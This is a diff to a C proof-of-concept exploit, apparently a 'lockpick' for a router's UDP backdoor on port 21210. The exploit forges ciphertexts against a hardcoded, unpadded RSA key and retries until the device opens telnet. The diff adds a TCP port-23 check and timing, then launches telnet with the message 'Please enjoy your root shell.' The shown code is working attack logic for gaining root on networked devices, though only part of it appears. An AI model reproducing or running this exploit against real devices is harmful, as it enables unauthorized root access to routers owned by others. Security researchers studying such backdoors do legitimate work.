@@ -1,5 +1,5 @@
 #include <stdio.h>
-#include <time.h>
+#include <sys/time.h>
 #include <stdlib.h>
 #include <string.h>
 #include <unistd.h>
@@ -15,6 +15,7 @@
 
 //#include "lockpick.h"
 #define BACKDOOR_PORT 21210
+#define TELNET_PORT 23
 #define PLAINTEXT_LENGTH 0x20
 #define CIPHERTEXT_LENGTH 0x80
 
@@ -195,7 +196,7 @@ int test() {
 //// UDP Stuff
 
 
-int communicate(char *router_ip, 
+int communicate(char *ip_addr, 
     unsigned int port,
     unsigned char *msg, 
     unsigned int msg_len, 
@@ -217,17 +218,17 @@ int communicate(char *router_ip,
 
   // Set address information
   server_addr.sin_family = AF_INET;
-  server_addr.sin_addr.s_addr = inet_addr(router_ip);
+  server_addr.sin_addr.s_addr = inet_addr(ip_addr);
   server_addr.sin_port = htons(port);
   /*
-  printf("[-] Binding to address %s on port %d\n", router_ip, port);
+  printf("[-] Binding to address %s on port %d\n", ip_addr, port);
   if (0 > bind(sockfd, (struct sockaddr*)&server_addr, sizeof(server_addr))) {
     puts("Bind fail!");
     close(sockfd);
     exit(1);
   }
 */
-  printf("[-] Sending message to %s on UDP port %d:\n", router_ip, port);
+  printf("[-] Sending message to %s on UDP port %d:\n", ip_addr, port);
   hexdump(msg, msg_len);
 
   sendto(sockfd, (const char*) msg, msg_len, NO_FLAGS, 
@@ -251,21 +252,34 @@ int communicate(char *router_ip,
 }
 
 
-/*
-173 def search_for_payloads(n=1):
-  174     payloads = []
-  175     while len(payloads) < n:
-  176         phony_ciphertext = os.urandom(32)
-  177         plaintext = pub_decrypt(phony_ciphertext)
-  178         for ch in range(0x21, 0x21 + 0x5d):
-    179             if plaintext[0] ^ ch == 0x00:
-    180                 print(f"[!] Found payload: {phony_ciphertext.hex().upper()}")
-    181                 print(f"[=] Decrypts to:   {plaintext.hex().upper()}")
-    182                 print(f"[=] First character {plaintext[0]:02X} ^ '{chr(ch)}' == 0x00")
-    183                 payloads.append(phony_ciphertext)
-  184                 break
-  185     return payloads
-*/
+
+int check_tcp_port(char *ip_addr, int port) {
+  int sockfd;
+
+  sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+  if(sockfd == -1){
+    puts("[x] Failed to create socket. Fatal.");
+    exit(1);
+  }
+  struct sockaddr_in server_addr;
+  memset(&server_addr,0,sizeof(struct sockaddr_in));
+
+  // Set address information
+  server_addr.sin_family = AF_INET;
+  server_addr.sin_addr.s_addr = inet_addr(ip_addr);
+  server_addr.sin_port = htons(port);
+  if (connect(sockfd,(struct sockaddr *) &server_addr,sizeof(server_addr)) < 0) {
+    printf("[x] Port %d on %s is closed.\n", port, ip_addr);
+    close(sockfd);
+    return 0;
+  } else {
+    printf("[!] Port %d on %s is open.\n", port, ip_addr);
+    close(sockfd);
+    return 1;
+  }
+}
+
+
 
 char *find_phony_ciphertext(RSA *rsa) {
   char *phony_ciphertext;
@@ -344,20 +358,25 @@ int main(int argc, char **argv) {
   char backdoor_key[16];
   char *magic_salt = "+TEMP";
   char *id;
-  clock_t start;
-  clock_t elapsed;
   unsigned char buffer[CIPHERTEXT_LENGTH];
   int tries = 1000;
+  int tries_left = tries;
   char *telnet_command;
-  
+  struct timeval timecheck;
+  long int start;
+  long int elapsed;
+
   printf("[+] Initializing RSA Cipher with:\n- hardcoded e: 0x%X\n- hardcoded n: 0x%s\n- no padding\n", HARDCODED_e, HARDCODED_n);
 
   rsa = init_rsa();
   telnet_command = malloc(0x80 * sizeof(char));
   sprintf(telnet_command, "telnet %s 23", ip_addr);
+  
+  gettimeofday(&timecheck, NULL);
+  start = (long)timecheck.tv_sec * 1000 + (long)timecheck.tv_usec / 1000;
 
   do {
-    tries -= 1;
+    tries_left -= 1;
     bar('=');
     printf("[*] ENTERING STAGE I\n");
     bar('=');
@@ -410,14 +429,21 @@ int main(int argc, char **argv) {
 
     /* Now test to see if the telnet port is open. */
 
-    if (system(telnet_command)) {
-      printf("[+] Not yet. %d tries remaining...\n", tries);
-    } else {
-      printf("[*] PoC complete.\n");
+    if (check_tcp_port(ip_addr, TELNET_PORT)) {
+
+      gettimeofday(&timecheck, NULL);
+      elapsed = ((long)timecheck.tv_sec * 1000 + (long)timecheck.tv_usec / 1000) - start;
+
+      printf("[*] The backdoor lock has been picked in %ld msec with %d attempts.\n", elapsed, tries - tries_left);
+      printf("[*] Please enjoy your root shell.\n");
+      system(telnet_command);
+      printf("[*] PoC complete. Have a nice day.\n");
       exit(0);
+    } else {
+      printf("[+] Not yet. %d tries remaining...\n", tries);
     }
 
-  } while (tries);
+  } while (tries_left);
   
   return 0;
 }
